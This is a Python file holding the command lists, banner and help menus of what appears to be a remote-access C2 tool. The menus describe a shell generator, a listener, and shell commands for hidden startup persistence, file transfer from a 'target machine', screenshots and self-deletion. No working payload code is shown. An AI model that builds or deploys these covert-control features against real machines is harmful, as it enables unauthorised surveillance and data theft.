from termcolor import colored

class CommandModes:

    server_commands = ["generator", "start_listener", "geo_ip", "_help",
                       "list_db", "del_db"]

    generator_commands = ["set_host ", "set_port ", "set_name ", "set_agent ",
                          "generate", "show", "_help"]

    shell_commands = ["cd", "get_file", "download_file", "find_file",
                      "kill", "auto_run",
                      "terminate", "screenshot","system_info",
                      "_help", "_termenate"]


def generator_help(flag: str):
        print(f"""
        [+] Help @ <<{colored(flag, 'green')}>>

        Commands        Description
        --------        -----------
        set_host        set your remote/local address -IPv4-
        set_port        set port number
        set_name        set the C2 name to label it with
        show            display all the currant value of name, host, and port
        generate        generate your C2 with given name, host, and port number.
        _help           Google it Hahaha :)
        """)

def banner():
        print(colored(f"""
             ___     _       _      ___                                  _   
            | __|_ _| |_ ___| |_   | __| _ __ _ _ __  _____ __ _____ _ _| |__
            | _/ _` |  _/ -_) ' \  | _| '_/ _` | '  \/ -_) V  V / _ \ '_| / /
            |_|\__,_|\__\___|_||_| |_||_| \__,_|_|_|_\___|\_/\_/\___/_| |_\_\ 
        ,_,_,_,_,_,_,_,_,_,_|______________________________________________________
        |#|#|#|#|#|#|#|#|#|#|_____________________________________________________/
        '-'-'-'-'-'-'-'-'-'-|---------------By: Hossam Hamdy 0xGhazy-------------'\n
            """, "red"))


def main_help(flag: str):
        print(colored(f"""
        [+] Help @ <<{colored(flag, 'green')}>>

        Tool-Options           Description
        ============           ===========
        start_listener         Start listening for incoming connection.
        generator              Generate a new Shell file.
        geo_ip                 Getting geo information about ip address.

        """, "green"))


#TODO: look at it at the end to change it.
def shell_help(flag: str):
        print(colored(f"""
        [+] Help @ <<{colored(flag, 'green')}>>

        Shell-Options           Description
        =============           ===========
        auto_run                Adding shell to startup file and make it hidden.
        send                    Sending binary files from your 'SENDING_PATH' dir to target machine.
        get                     Downloading binary files from the target machine.
        port_scanner            Scanning ip address for opened port numbers.
        geoip                   Getting information about ip address.
        sysinfo                 Display all system's information like 'systeminfo'
        list_programs           Display a list of all installed programs.
        snapshot                Getting screenshot from target machine.
        read                    Reading text files such as .py, .html, .txt, .cpp.
        find                    Searching for files in a specific partition with specific exetention.
        md5                     Calculationg hash sum for files.
        terminate               Closing the connection between the attacker and the target.
        kill                    Killing the client shell by ending the connection and deleting shell file.
        \n""", "green"))

